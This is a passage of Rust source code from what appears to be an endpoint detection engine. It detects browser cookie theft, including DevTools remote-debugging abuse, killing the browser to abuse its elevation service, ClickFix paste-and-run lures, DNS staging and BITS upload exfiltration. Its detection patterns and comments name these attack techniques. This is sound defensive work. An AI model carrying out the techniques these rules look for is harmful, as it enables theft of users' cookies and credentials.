            let killed = self.states.get(&proc_.guid).is_some_and(|s| s.killed);
            if hit.suspend
                && !killed
                && !self.protected(&proc_)
                && !self.suspends.iter().any(|w| w.guid == proc_.guid)
                && proc_.exit_ts.is_none()
            {
                let already_killing = actions.iter().any(|a| matches!(a, ResponseAction::KillProcess { guid: Some(g), .. } if *g == proc_.guid));
                if !already_killing {
                    actions.insert(
                        0,
                        ResponseAction::SuspendProcess {
                            pid: proc_.pid,
                            guid: Some(proc_.guid.clone()),
                        },
                    );
                    self.suspends.push(SuspendWindow {
                        guid: proc_.guid.clone(),
                        pid: proc_.pid,
                        image: proc_.image.clone(),
                        sha256: proc_.sha256.clone(),
                        quarantine: proc_.path_class.is_user_writable(),
                        deadline: ev.ts + self.policy.suspend_window_ms as i64,
                        kill_at_expiry: hit.kill_at_expiry,
                        kill_capable: hit.rule == ST01 || hit.rule == ST03,
                        st12_key: (hit.rule == ST12)
                            .then(|| st12_key(&proc_))
                            .filter(|k| k.starts_with("sha256:")),
                    });
                    hit.summary.push_str(&format!(
                        " — suspended for {:.1} s pending a verdict",
                        self.policy.suspend_window_ms as f64 / 1000.0
                    ));
                }
            } else if hit.kill_at_expiry {
                if let Some(w) = self.suspends.iter_mut().find(|w| w.guid == proc_.guid) {
                    w.kill_at_expiry = true;
                }
            }
            actions = self.filter_actions(actions, Some(ev));
            for a in &actions {
                if matches!(a, ResponseAction::RemoveAutorun { .. }) {
                    self.note_autorun_ordered(a, ev.ts);
                }
            }
            for a in &actions {
                if let ResponseAction::KillProcess { guid: Some(g), .. } = a {
                    self.state(g, ev.ts).killed = true;
                    self.suspends.retain(|w| &w.guid != g);
                }
            }
            let st = self.state(&hit.guid, ev.ts);
            for a in &actions {
                if st.ordered.len() < 256 {
                    st.ordered.insert(format!("{a:?}"));
                }
            }
        }

        let (name, author, attack) = match builtin_meta().get(hit.rule.as_str()) {
            Some(m) => (m.name.clone(), None, m.attack.clone()),
            None => (
                hit.name
                    .clone()
                    .unwrap_or_else(|| ioc_rule_name(&hit.rule).to_string()),
                hit.author.clone(),
                hit.attack.clone().unwrap_or_default(),
            ),
        };
        let unknown = is_unknown_subject(&proc_);
        let st = self.state(&hit.guid, ev.ts);
        if unknown {
            // The synthetic subject is shared by unrelated unattributed
            // changes: never mix their evidence.
            st.evidence.clear();
        }
        // Family tick hits carry a synthetic trigger (pid 0, empty guid).
        if !(ev.pid == 0 && ev.guid.0.is_empty()) {
            st.add_evidence(ev);
        }
        let mut evidence: Vec<Event> = st.evidence.iter().cloned().collect();
        let data_at_risk = st.data_at_risk.clone();
        st.set_fired(&dedup_key, ev.ts);
        for x in hit.extra_evidence {
            if !evidence.contains(&x) {
                evidence.push(x);
            }
        }
        if evidence.len() > MAX_EVIDENCE {
            evidence.drain(..evidence.len() - MAX_EVIDENCE);
        }
        let alert = Alert {
            id: Uuid::now_v7(),
            ts: ev.ts,
            rule_id: hit.rule.clone(),
            rule_name: name,
            rule_author: author,
            severity: hit.severity,
            attack,
            mode,
            summary: hit.summary,
            ancestry: self.table.ancestry(&proc_.guid, MAX_ANCESTRY),
            process: proc_,
            data_at_risk,
            evidence,
            actions: vec![],
            protection_off: self.paused,
        };
        self.out.push(Output::Alert(Detection { alert, actions }));
    }

    // ------------------------------------------------------------------
    // dispatch
    // ------------------------------------------------------------------

    pub fn process(&mut self, e: &Event) -> Vec<Output> {
        // Kestrel's own install (lab 2026-10-21): the SCM 7045 record of the
        // agent service and the tray's HKLM Run value written by msiexec.
        // Not judged by any rule, Sigma or family (like agent_spawned).
        if self.is_own_install_artifact(e) {
            return Vec::new();
        }
        match &e.data {
            EventData::ProcessStart(ps) => self.on_process_start(e, ps),
            EventData::ProcessStop { .. } => self.on_process_stop(e),
            EventData::FileAccess { path, op } => self.on_file(e, path, *op),
            EventData::NetConnect {
                dst_ip,
                dst_port,
                dst_host,
                ..
            } => self.on_net(e, dst_ip, *dst_port, dst_host.as_deref()),
            EventData::DnsQuery { qname, answers } => self.on_dns(e, qname, answers),
            EventData::DpapiUnprotect { description } => self.on_dpapi(e, description),
            EventData::ProcessAccess(t)
            | EventData::RemoteThread(t)
            | EventData::ThreadContext(t)
            | EventData::DebugAttach(t) => self.on_target(e, t),
            EventData::ImageLoad {
                path,
                signer,
                signed,
            } => self.on_image_load(e, path, signer.as_deref(), *signed),
            EventData::RegistrySet {
                key,
                value_name,
                data,
                op,
                ..
            } => {
                if *op == RegistryOp::Set {
                    self.on_registry(e, key, value_name, data.as_deref())
                }
            }
            EventData::ScriptBlock { content, .. } => self.on_script(e, content),
            EventData::Tamper { kind, detail } => self.on_tamper(e, *kind, detail),
            // Handled by the rule families only.
            EventData::FileActivity(_)
            | EventData::TaskRegistered(_)
            | EventData::ServiceInstalled(_)
            | EventData::WmiSubscription(_) => {}
        }
        if self.sigma_kinds & kind_bit(e.kind()) != 0 {
            self.eval_sigma(e);
        }
        self.run_families(e, e.ts, |f, ctx, out| f.on_event(ctx, e, out), 0);
        std::mem::take(&mut self.out)
    }

    pub fn tick(&mut self, now: TimestampMs) -> Vec<Output> {
        let mut i = 0;
        while i < self.suspends.len() {
            if self.suspends[i].deadline <= now {
                let w = self.suspends.remove(i);
                if w.kill_at_expiry {
                    self.out.push(Output::Action(ResponseAction::KillProcess {
                        pid: w.pid,
                        guid: Some(w.guid.clone()),
                        tree: true,
                    }));
                    if w.quarantine {
                        let q = self.filter_actions(
                            vec![ResponseAction::QuarantineFile {
                                path: w.image.clone(),
                                sha256: w.sha256.clone(),
                            }],
                            None,
                        );
                        self.out.extend(q.into_iter().map(Output::Action));
                    }
                } else {
                    if let Some(s) = w.st12_key.as_ref().and_then(|k| self.st12_seen.get_mut(k)) {
                        s.resumed = s.resumed.saturating_add(1);
                    }
                    self.out.push(Output::Action(ResponseAction::ResumeProcess {
                        pid: w.pid,
                        guid: Some(w.guid.clone()),
                    }));
                }
            } else {
                i += 1;
            }
        }
        // NEW-1: autorun removals held back by the re-issue rate limit.
        let due: Vec<ResponseAction> = self
            .autorun_reissue
            .values_mut()
            .filter_map(|(last, pending)| {
                if pending.is_some() && (now < *last || now - *last >= AUTORUN_REISSUE_MS) {
                    *last = now;
                    pending.take()
                } else {
                    None
                }
            })
            .collect();
        self.out.extend(due.into_iter().map(Output::Action));
        self.clickfix.retain(|c| c.until > now);
        while self
            .browser_stops
            .front()
            .is_some_and(|(t, _)| now - t > ST08_ATTRIBUTION_MS * 2)
        {
            self.browser_stops.pop_front();
        }
        while self
            .kill_intents
            .front()
            .is_some_and(|(t, _)| now - t > ST08_ATTRIBUTION_MS * 2)
        {
            self.kill_intents.pop_front();
        }
        if now - self.last_evict >= EVICT_INTERVAL_MS {
            self.last_evict = now;
            self.debug_ports.retain(|_, t| now - *t < DEBUG_PORT_TTL_MS);
            self.tree
                .retain(|_, c| now < c.last_ts || now - c.last_ts < TREE_TTL_MS);
            while self
                .bits_jobs
                .front()
                .is_some_and(|(t, _)| now - t > BITS_JOB_TTL_MS)
            {
                self.bits_jobs.pop_front();
            }
            self.autorun_reissue
                .retain(|_, (t, p)| p.is_some() || (now >= *t && now - *t < AUTORUN_REISSUE_MS));
            for g in self.table.evict(now) {
                self.states.remove(&g);
                self.agent_guids.remove(&g);
                self.agent_children.remove(&g);
                if self.lsass_guid.as_ref() == Some(&g) {
                    self.lsass_guid = None;
                }
                for f in self.families.iter_mut() {
                    f.forget(&g);
                }
            }
            let table = &self.table;
            self.states.retain(|g, s| {
                table.get(g).is_some_and(|p| p.exit_ts.is_none())
                    || now - s.last_activity < STATE_IDLE_MS
            });
            for s in self.states.values_mut() {
                s.fired.retain(|(_, t)| now - *t < DEDUP_MS);
            }
        }
        // Rule families. Tick hits have no triggering event: the subject is
        // looked up in the table (families set `process` for exited ones) and
        // the evidence comes from `extra_evidence`.
        let tick_ev = Event {
            ts: now,
            pid: 0,
            guid: ProcessGuid::default(),
            data: EventData::ProcessStop { exit_code: None },
        };
        let from = self.out.len();
        self.run_families(&tick_ev, now, |f, ctx, out| f.tick(ctx, out), from);
        std::mem::take(&mut self.out)
    }

    // ------------------------------------------------------------------
    // process lifecycle (ST-05, ST-08, ST-10 pending, ST-11, ST-12, ST-13, IOCs)
    // ------------------------------------------------------------------

    fn on_process_start(&mut self, e: &Event, ps: &ProcessStart) {
        let info = ProcessInfo {
            guid: e.guid.clone(),
            pid: e.pid,
            ppid: ps.ppid,
            parent_guid: ps.parent_guid.clone(),
            image: ps.image.clone(),
            cmdline: ps.cmdline.clone(),
            user: ps.user.clone(),
            integrity: ps.integrity,
            start_ts: e.ts,
            exit_ts: None,
            signer: ps.signer.clone(),
            signed: ps.signed,
            sha256: ps.sha256.clone(),
            motw_zone: ps.motw_zone,
            file_size: ps.file_size,
            path_class: path_class_of(&ps.image, self.system_drive),
        };
        self.note_agent(&info, ps.agent_spawned);
        self.table.insert(info.clone());
        self.note_lsass(&info);
        if self.is_agent_owned(&info.guid) {
            return;
        }
        let name = file_name_lower(&info.image);
        let cmd_lower = info.cmdline.to_ascii_lowercase();
        let parent = self.table.parent_of(&info).cloned();
        let parent_name = parent
            .as_ref()
            .map(|p| file_name_lower(&p.image))
            .unwrap_or_default();
        let chromium = is_chromium_image(&info.image);
        if chromium && !cmd_lower.contains("--type=") {
            self.last_browser_start = e.ts;
        }

        self.check_process_iocs(e, &info);

        // Fix round 2026-10-25 (corpus `evasion_exfil_bitsadmin`): a BITS
        // upload job created by this process; the BITS service's upload is
        // then linked back to this tree by ST-04.
        let bits_upload = (name == "bitsadmin.exe" && cmd_lower.contains("/upload"))
            || (matches!(name.as_str(), "powershell.exe" | "pwsh.exe")
                && cmd_lower.contains("start-bitstransfer")
                && cmd_lower.contains("upload"));
        if bits_upload {
            self.bits_jobs.push_back((e.ts, info.guid.clone()));
            if self.bits_jobs.len() > 256 {
                self.bits_jobs.pop_front();
            }
        }
        // FP-18: a genuine browser installer / updater run.
        if identity::genuine(&info, self.system_drive, false) {
            let dl = driveless(&info.image);
            let installer = name == "setup.exe"
                && BROWSER_APP_DIRS.iter().any(|d| dl.contains(d))
                && dl.contains(r"\installer\");
            let updater = matches!(
                name.as_str(),
                "braveupdate.exe" | "googleupdate.exe" | "microsoftedgeupdate.exe"
            ) || (name == "updater.exe"
                && (dl.contains(r"\google\googleupdater\") || dl.contains(r"\bravesoftware\")));
            if installer || updater {
                self.last_browser_update = e.ts;
            }
        }

        // ST-05 browser debugging abuse. Re-review N5: Chromium accepts
        // `--`, `-` and `/` switch prefixes on Windows; parse them all.
        let sw = crate::legit_apps::switches(&cmd_lower);
        let has = |n: &str| sw.iter().any(|(k, _)| k == n);
        let val = |n: &str| {
            sw.iter()
                .find(|(k, _)| k == n)
                .and_then(|(_, v)| v.as_deref())
        };
        if chromium && !has("type") {
            if let Some(port) = val("remote-debugging-port").and_then(|p| p.parse::<u16>().ok()) {
                if port != 0
                    && (self.debug_ports.len() < 64 || self.debug_ports.contains_key(&port))
                {
                    self.debug_ports.insert(port, e.ts);
                }
            }
            let debug = sw.iter().any(|(k, _)| k.starts_with("remote-debugging-"));
            let off_screen = val("window-position").is_some_and(|v| v.starts_with('-'));
            let alt = has("user-data-dir") || has("headless") || off_screen;
            let load_ext = has("load-extension");
            let port_zero = val("remote-debugging-port") == Some("0");
            let parent_ok = parent_name == "explorer.exe" || is_browser_image(&parent_name);
            if ((debug && alt && !port_zero) || load_ext) && !parent_ok {
                let what = if load_ext && !debug {
                    "with --load-extension (unpacked extension side-loading)".to_string()
                } else {
                    let mut flags = vec!["remote debugging"];
                    if has("headless") {
                        flags.push("headless");
                    }
                    if has("user-data-dir") {
                        flags.push("an alternate profile directory");
                    }
                    if off_screen {
                        flags.push("an off-screen window");
                    }
                    format!(
                        "with {}",
                        join_and(&flags.iter().map(|s| s.to_string()).collect::<Vec<_>>())
                    )
                };
                let pdesc = parent
                    .as_ref()
                    .map(describe)
                    .unwrap_or_else(|| format!("process {}", info.ppid));
                let mut hit = Hit::new(ST05, &info.guid, Severity::High, format!("{pdesc} launched {} {what}, a technique used to pull cookies through the DevTools protocol", short_name(&info)));
                if self.browser_automation(&info, parent.as_ref(), load_ext) {
                    // FP-08: test automation against a throw-away profile.
                    hit.severity = Severity::Low;
                    hit.mode_override = Some(RuleMode::Audit);
                    hit.summary.push_str(" (test automation: the profile is a fresh Playwright / Puppeteer temporary profile or the automation framework's own browser, not the user's real profile, and the launching tree read no browser store; alert only)");
                } else {
                    hit.actions.push(kill(&info, true));
                    if let Some(p) = &parent {
                        if !is_browser_image(&p.image) {
                            hit.actions.push(kill(p, false));
                            if p.path_class.is_user_writable() {
                                hit.actions.push(quarantine(p));
                            }
                        }
                    }
                }
                self.state(&info.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
            }
        }

        // ST-08 kill intents (taskkill / Stop-Process / wmic against browsers)
        if matches!(
            name.as_str(),
            "taskkill.exe" | "powershell.exe" | "pwsh.exe" | "wmic.exe" | "cmd.exe"
        ) && (cmd_lower.contains("chrome")
            || cmd_lower.contains("msedge")
            || cmd_lower.contains("brave"))
            && (cmd_lower.contains("taskkill")
                || cmd_lower.contains("stop-process")
                || cmd_lower.contains("kill")
                || cmd_lower.contains("terminate"))
        {
            // Attribute to the process that ran the kill command (unless it is a shell host we never kill).
            let actor = parent
                .as_ref()
                .filter(|p| !is_browser_image(&p.image) && !self.protected(p))
                .map(|p| p.guid.clone());
            self.kill_intents
                .push_back((e.ts, actor.unwrap_or_else(|| info.guid.clone())));
            if self.kill_intents.len() > 256 {
                self.kill_intents.pop_front();
            }
        }

        // ST-08 elevation service abuse
        if name == "elevation_service.exe" {
            self.check_elevation_abuse(e, &info);
        }
        // ST-08 (b) unsigned image executing from a browser Application directory
        self.check_st08b(e, &info);

        // ST-10 pending ClickFix kills (RunMRU written before this child appeared)
        if let Some(pg) = &parent.as_ref().map(|p| p.guid.clone()) {
            let mut kill_now = false;
            for c in &self.clickfix {
                if &c.writer == pg && e.ts <= c.until && c.protect && name.starts_with(c.lolbin) {
                    kill_now = true;
                }
            }
            if kill_now && !self.protected(&info) {
                self.out.push(Output::Action(kill(&info, true)));
            }
        }

        // ST-11 paste-and-run chain
        self.check_paste_and_run(e, &info, parent.as_ref(), &name, &cmd_lower);

        // ST-12 untrusted execution from user paths
        self.check_st12(e, &info, parent.as_ref());

        // ST-13 candidate (.NET LOLBin with no project or unusual parent)
        if DOTNET_LOLBINS.contains(&name.as_str()) {
            let no_args = !has_arguments(&info.cmdline);
            let unusual_parent = parent.as_ref().is_some_and(|p| {
                let pn = file_name_lower(&p.image);
                !DOTNET_EXPECTED_PARENTS.contains(&pn.as_str())
                    && (Self::untrusted_actor(p)
                        || pn == "explorer.exe"
                        || pn.starts_with("winword")
                        || pn.starts_with("excel")
                        || pn == "outlook.exe")
            });
            if no_args || unusual_parent {
                let st = self.state(&info.guid, e.ts);
                st.st13 = Some(if no_args {
                    "without a project or assembly argument"
                } else {
                    "from an unusual parent"
                });
                st.add_evidence(e);
            }
        }

        // IOC URL in command line
        if let Some(h) = self.iocs.by_url_in(&cmd_lower).cloned() {
            self.emit_ioc(
                e,
                &info,
                IOC_URL,
                &h,
                format!(
                    "{} was started with a command line containing the known-bad URL {}",
                    describe(&info),
                    h.value
                ),
                vec![kill(&info, true)],
            );
        }
    }

    /// ST-08 (b): an image without a valid signature executing from a
    /// browser Application directory. `Unknown` is not judged here (a
    /// browser's own binaries would be hit while enrichment is pending); it
    /// is evaluated when the facts arrive ([`EngineState::enrich_process`]).
    fn check_st08b(&mut self, e: &Event, info: &ProcessInfo) {
        if matches!(
            info.signed,
            SignatureState::Unsigned | SignatureState::Invalid
        ) && !info.image.is_empty()
        {
            let dl = driveless(&info.image);
            if BROWSER_APP_DIRS.iter().any(|d| dl.contains(d)) {
                let mut hit = Hit::new(ST08, &info.guid, Severity::High, format!("{} ran from the browser's Application folder without a valid signature — code placed there can ask the browser's elevation service to decrypt cookies", describe(info)));
                hit.actions.push(kill(info, false));
                hit.actions.push(quarantine(info));
                self.state(&info.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
            }
        }
    }

    /// ST-12: unsigned / invalidly signed image started from a user-writable
    /// location. `Unknown` is re-evaluated on late enrichment.
    fn check_st12(&mut self, e: &Event, info: &ProcessInfo, parent: Option<&ProcessInfo>) {
        if matches!(
            info.signed,
            SignatureState::Unsigned | SignatureState::Invalid
        ) && info.path_class.is_user_writable()
        {
            let mut sev = Severity::Low;
            let mut extra = Vec::new();
            if info.motw_zone == Some(3) {
                sev = Severity::Medium;
            }
            if info.file_size.is_some_and(|s| s > LARGE_IMAGE_BYTES) {
                sev = if sev == Severity::Medium {
                    Severity::High
                } else {
                    Severity::Medium
                };
                extra.push(format!(
                    "{} MB, likely padded to evade scanning",
                    info.file_size.unwrap_or(0) / (1024 * 1024)
                ));
            }
            let mut summary = format!("{} started", describe(info));
            if let Some(p) = parent {
                summary.push_str(&format!(" from {}", short_name(p)));
            }
            if !extra.is_empty() {
                summary.push_str(&format!(" ({})", extra.join(", ")));
            }
            // Triage 2026-10-22 item 1 (6,900 ST-12 alerts from rustc /
            // cargo / clippy-driver / protoc / wix / makensis): first-seen.
            // One alert per binary (sha256, else path + size) per device per
            // 7 days; later executions are folded into it. The same binary
            // from a riskier folder (Temp / Downloads / removable) alerts
            // again.
            let key = st12_key(info);
            let rank = st12_rank(info.path_class);
            let prev = self.st12_seen.get(&key).copied();
            // Review M1: in Protect mode every run is still suspended and
            // judged (folding would skip the suspend window).
            // FP-14 (fix round 2026-10-25, 25,383 Protect suspends of
            // compilers on the owner's PC): once the same binary, by sha256
            // (never path + size), was suspended, judged and resumed
            // `ST12_PROTECT_RESUMES` times within 7 days from an equally or
            // more exposed folder, later runs are folded like in Audit. A new
            // build of the tool (new hash) is judged again.
            let fold_ok = self.mode(ST12) != RuleMode::Protect
                || (key.starts_with("sha256:")
                    && prev.is_some_and(|s| s.resumed >= ST12_PROTECT_RESUMES));
            self.state(&info.guid, e.ts).add_evidence(e);
            if let Some(s) = prev.filter(|_| fold_ok) {
                if e.ts >= s.last_alert
                    && e.ts - s.last_alert < ST12_FIRST_SEEN_MS
                    && rank <= s.rank
                {
                    // Already reported within 7 days from an equally or more
                    // exposed folder: fold this execution into that alert.
                    if let Some(s) = self.st12_seen.get_mut(&key) {
                        s.repeats = s.repeats.saturating_add(1);
                    }
                    return;
                }
                if rank > s.rank && e.ts - s.last_alert < ST12_FIRST_SEEN_MS {
                    summary.push_str(" — the same file ran before from a less exposed folder and now runs from a riskier one");
                } else if s.repeats > 0 {
                    summary.push_str(&format!(
                        " — it ran {} more times since the previous alert for this file",
                        s.repeats
                    ));
                }
            }
            let mut hit = Hit::new(ST12, &info.guid, sev, summary);
            hit.suspend = true;
            self.state(&info.guid, e.ts).add_evidence(e);
            let before = self.out.len();
            self.emit(e, hit);
            let alerted = self.out[before..]
                .iter()
                .any(|o| matches!(o, Output::Alert(d) if d.alert.rule_id == ST12));
            if alerted {
                let rank = match prev {
                    Some(s) if e.ts - s.last_alert < ST12_FIRST_SEEN_MS => rank.max(s.rank),
                    _ => rank,
                };
                if !self.st12_seen.contains_key(&key) && self.st12_seen.len() >= MAX_ST12_SEEN {
                    let now = e.ts;
                    self.st12_seen.retain(|_, s| {
                        now >= s.last_alert && now - s.last_alert < ST12_FIRST_SEEN_MS
                    });
                    if self.st12_seen.len() >= MAX_ST12_SEEN {
                        if let Some(k) = self
                            .st12_seen
                            .iter()
                            .min_by_key(|(_, s)| s.last_alert)
                            .map(|(k, _)| k.clone())
                        {
                            self.st12_seen.remove(&k);
                        }
                    }
                }
                let resumed = match prev {
                    Some(s) if e.ts >= s.last_alert && e.ts - s.last_alert < ST12_FIRST_SEEN_MS => {
                        s.resumed
                    }
                    _ => 0,
                };
                self.st12_seen.insert(
                    key,
                    SeenBinary {
                        last_alert: e.ts,
                        rank,
                        repeats: 0,
                        resumed,
                    },
                );
            }
        }
    }

    /// First-seen ST-12 memory for persistence across agent restarts
    /// (triage 2026-10-22 item 1): JSON array of
    /// `[key, last_alert_ms, rank, repeats]`, entries younger than 7 days.
    pub fn st12_seen_export(&self, now: TimestampMs) -> String {
        let rows: Vec<(&String, i64, u8, u32)> = self
            .st12_seen
            .iter()
            // Only hash identities survive a restart (review 1.1.6 #7): a
            // path + size identity (no hash: images over the hashing limit)
            // could be swapped for a same-size payload at the same path.
            .filter(|(k, _)| k.starts_with("sha256:"))
            .filter(|(_, s)| now >= s.last_alert && now - s.last_alert < ST12_FIRST_SEEN_MS)
            .map(|(k, s)| (k, s.last_alert, s.rank, s.repeats))
            .collect();
        serde_json::to_string(&rows).unwrap_or_else(|_| "[]".into())
    }

    /// Restore [`Self::st12_seen_export`] output (malformed input is ignored;
    /// bounded to [`MAX_ST12_SEEN`] entries, newest kept). Rows already
    /// expired at `now`, or stamped more than a day after `now` (clock moved
    /// back, or a damaged value that would silence ST-12 for good), are
    /// dropped: the binary then simply alerts once more.
    pub fn st12_seen_import(&mut self, json: &str, now: TimestampMs) {
        let Ok(mut rows) = serde_json::from_str::<Vec<(String, i64, u8, u32)>>(json) else {
            return;
        };
        rows.retain(|r| {
            r.0.starts_with("sha256:")
                && r.1 <= now.saturating_add(24 * 3600 * 1000)
                && now.saturating_sub(r.1) < ST12_FIRST_SEEN_MS
        });
        rows.sort_by_key(|r| std::cmp::Reverse(r.1));
        for (k, last_alert, rank, repeats) in rows.into_iter().take(MAX_ST12_SEEN) {
            if k.len() > 1024 || self.st12_seen.len() >= MAX_ST12_SEEN {
                continue;
            }
            let e = self.st12_seen.entry(k).or_insert(SeenBinary {
                last_alert,
                rank: rank.clamp(1, 2),
                repeats,
                resumed: 0,
            });
            if last_alert > e.last_alert {
                e.last_alert = last_alert;
                e.rank = rank.clamp(1, 2);
            }
        }
    }

    fn check_process_iocs(&mut self, e: &Event, info: &ProcessInfo) {
        if let Some(h) = self.iocs.by_hash(info).cloned() {
            if h.action != IocAction::Allow {
                let s = format!(
                    "{} matches known-bad file hash {}{}",
                    describe(info),
                    truncate(&h.value, 16),
                    if h.description.is_empty() {
                        String::new()
                    } else {
                        format!(" ({})", h.description)
                    }
                );
                self.emit_ioc(
                    e,
                    info,
                    IOC_HASH,
                    &h,
                    s,
                    vec![kill(info, true), quarantine(info)],
                );
            }
        }
        if let Some(h) = self.iocs.by_cert(info).cloned() {
            if h.action != IocAction::Allow {
                let s = format!(
                    "{} is signed by blocked certificate \"{}\"",
                    describe(info),
                    info.signer.clone().unwrap_or_default()
                );
                self.emit_ioc(
                    e,
                    info,
                    IOC_CERT,
                    &h,
                    s,
                    vec![kill(info, true), quarantine(info)],
                );
            }
        }
    }

    fn emit_ioc(
        &mut self,
        e: &Event,
        info: &ProcessInfo,
        rule: &str,
        h: &IocHit,
        summary: String,
        actions: Vec<ResponseAction>,
    ) {
        let mut hit = Hit::new(
            rule,
            &info.guid,
            if h.action == IocAction::Block {
                Severity::High
            } else {
                Severity::Medium
            },
            summary,
        );
        hit.mode_override = Some(if h.action == IocAction::Block {
            RuleMode::Protect
        } else {
            RuleMode::Audit
        });
        hit.actions = actions;
        hit.process = Some(info.clone());
        hit.name = Some(ioc_rule_name(rule).to_string());
        hit.attack = Some(vec![]);
        // the same indicator on the same process alerts once per dedup window
        hit.dedup_key = Some(format!("{rule}:{}", h.id));
        self.state(&info.guid, e.ts).add_evidence(e);
        self.emit(e, hit);
    }

    fn on_process_stop(&mut self, e: &Event) {
        let img = self.table.get(&e.guid).map(|p| p.image.clone());
        self.table.mark_exit(&e.guid, e.ts);
        // FP-14: a suspended process can only exit after it was resumed (or
        // killed by something else): count it like a resume.
        let keys: Vec<String> = self
            .suspends
            .iter()
            .filter(|w| w.guid == e.guid)
            .filter_map(|w| w.st12_key.clone())
            .collect();
        for k in keys {
            if let Some(s) = self.st12_seen.get_mut(&k) {
                s.resumed = s.resumed.saturating_add(1);
            }
        }
        self.suspends.retain(|w| w.guid != e.guid);
        if let Some(img) = img {
            if is_chromium_image(&img) {
                self.browser_stops.push_back((e.ts, e.pid));
                if self.browser_stops.len() > 512 {
                    self.browser_stops.pop_front();
                }
            }
        }
    }

    fn check_elevation_abuse(&mut self, e: &Event, info: &ProcessInfo) {
        let stops: Vec<TimestampMs> = self
            .browser_stops
            .iter()
            .filter(|(t, _)| *t <= e.ts && e.ts - t <= ST08_WINDOW_MS)
            .map(|s| s.0)
            .collect();
        if stops.len() < ST08_MIN_STOPS {
            return;
        }
        let first = *stops.iter().min().unwrap_or(&e.ts);
        let last = *stops.iter().max().unwrap_or(&e.ts);
        let killer = self
            .kill_intents
            .iter()
            .rev()
            .find(|(t, g)| {
                *t <= e.ts && first - t <= ST08_ATTRIBUTION_MS && !self.is_agent_owned(g)
            })
            .map(|k| k.1.clone());
        let relaunched = self.last_browser_start > last && self.last_browser_start <= e.ts;
        match killer {
            Some(k) => {
                let kp = self
                    .table
                    .get(&k)
                    .cloned()
                    .unwrap_or_else(|| placeholder(&k, 0, e.ts));
                let mut hit = Hit::new(ST08, &k, Severity::High, format!("{} terminated the browser {} times and the browser elevation service started {} ms later — a known way to make the service decrypt cookies for a foreign caller", describe(&kp), stops.len(), e.ts - last));
                hit.actions.push(kill(&kp, false));
                hit.extra_evidence.push(e.clone());
                self.emit(e, hit);
            }
            // FP-18 (fix round 2026-10-25): Brave's updater stopped Brave and
            // the new version's elevation service started: a genuine browser
            // installer / updater ran in the last 5 minutes and nobody asked
            // to kill the browser.
            None if self.last_browser_update <= e.ts
                && e.ts.saturating_sub(self.last_browser_update) <= BROWSER_UPDATE_WINDOW_MS => {}
            None if !relaunched => {
                let hit = Hit::new(ST08, &info.guid, Severity::Medium, format!("The browser was terminated {} times and the browser elevation service started {} ms later without the browser being relaunched; the caller could not be identified", stops.len(), e.ts - last));
                self.state(&info.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
            }
            None => {}
        }
    }

    fn check_paste_and_run(
        &mut self,
        e: &Event,
        info: &ProcessInfo,
        parent: Option<&ProcessInfo>,
        name: &str,
        cmd_lower: &str,
    ) {
        let Some(parent) = parent else { return };
        let pn = file_name_lower(&parent.image);
        let grand = self.table.parent_of(parent).cloned();
        let gpn = grand
            .as_ref()
            .map(|g| file_name_lower(&g.image))
            .unwrap_or_default();
        let is_terminal =
            |n: &str| matches!(n, "windowsterminal.exe" | "wt.exe" | "openconsole.exe");
        let interactive_shell =
            CLICKFIX_SHELLS.contains(&pn.as_str()) && (gpn == "explorer.exe" || is_terminal(&gpn));
        let launcher =
            pn == "explorer.exe" || is_terminal(&pn) || is_browser_image(&pn) || interactive_shell;

        // nslookup staging: nslookup against a hard-coded external resolver from cmd/powershell
        if name == "nslookup.exe" && CLICKFIX_SHELLS.contains(&pn.as_str()) {
            let resolver = ipv4_tokens(cmd_lower)
                .into_iter()
                .find(|ip| is_external_ip(ip));
            let staged = parent.cmdline.to_ascii_lowercase().contains("nslookup")
                || gpn == "explorer.exe"
                || is_terminal(&gpn);
            if let (Some(ip), true) = (resolver, staged) {
                let mut hit = Hit::new(ST11, &info.guid, Severity::High, format!("{} ran nslookup against the hard-coded external DNS server {ip} — DNS-staged ClickFix delivers the next stage in the answer", short_name(parent)));
                // Only the nslookup child: the parent may be the user's own
                // interactive shell (an admin typing `nslookup host 8.8.8.8`).
                hit.actions.push(kill(info, false));
                self.state(&info.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
                return;
            }
        }
        if !launcher || !(CLICKFIX_SHELLS.contains(&name) || CLICKFIX_LOLBINS.contains(&name)) {
            return;
        }
        let Some(mut reason) = clickfix_reason(cmd_lower, name) else {
            return;
        };
        if is_browser_image(&pn) && !cmd_lower.contains('#') {
            // FileFix from a browser upload dialog needs the comment trick; else require encoded/hidden cradle
            if !(has_encoded_command(cmd_lower)
                || (has_hidden_window(cmd_lower) && reason.contains("download")))
            {
                return;
            }
        }
        if is_browser_image(&pn) && cmd_lower.contains('#') {
            reason = "a FileFix comment trick";
        }
        let via = if interactive_shell {
            format!("{} (in {})", short_name(parent), gpn)
        } else {
            short_name(parent)
        };
        let mut hit = Hit::new(ST11, &info.guid, Severity::High, format!("{via} started {} with {reason}: \"{}\" — the pattern of a ClickFix/FileFix paste-and-run lure", short_name(info), truncate(&info.cmdline, 160)));
        hit.actions.push(kill(info, true));
        self.state(&info.guid, e.ts).add_evidence(e);
        self.emit(e, hit);
    }

    // ------------------------------------------------------------------
    // files (ST-01, ST-02, ST-16)
    // ------------------------------------------------------------------

    fn on_file(&mut self, e: &Event, path: &str, op: FileOp) {
        // Sensor 2026-10-25: opens of any `Local State` under a profile or
        // the process's `--user-data-dir` arrive so the engine can tell a
        // process's own profile key from a foreign one (FP-04 / Xeno). On
        // its own such an open never raises anything.
        let lower_ls = path.len() >= 12
            && path
                .get(path.len() - 12..)
                .is_some_and(|t| t.eq_ignore_ascii_case(r"\local state"));
        let mut own_ls = false;
        if lower_ls
            && matches!(op, FileOp::Open | FileOp::Read)
            && !self.is_agent_owned(&e.guid)
            && e.pid != 0
            && e.pid != 4
        {
            let p = self.proc_info(e);
            let norm = normalize_path(path);
            let tainted = self.tainted(&p.guid);
            own_ls = self.own_profile_local_state(&p, &norm)
                || (match_normalized(&norm)
                    .is_some_and(|s| is_trusted_owner(&p, &s, &norm, self.system_drive, tainted))
                    && !self.electron_hijack_suspected(&p));
            let st = self.state(&e.guid, e.ts);
            if own_ls {
                st.own_ls_ts = Some(e.ts);
            } else {
                st.foreign_ls = true;
            }
        }
        if !may_be_sensitive(path) && !crate::paths::may_be_sensitive_short(path) {
            return;
        }
        let mut norm = normalize_path(path);
        let dl = strip_drive(&norm).to_string();
        if self.check_canary(e, &dl, op) {
            return;
        }
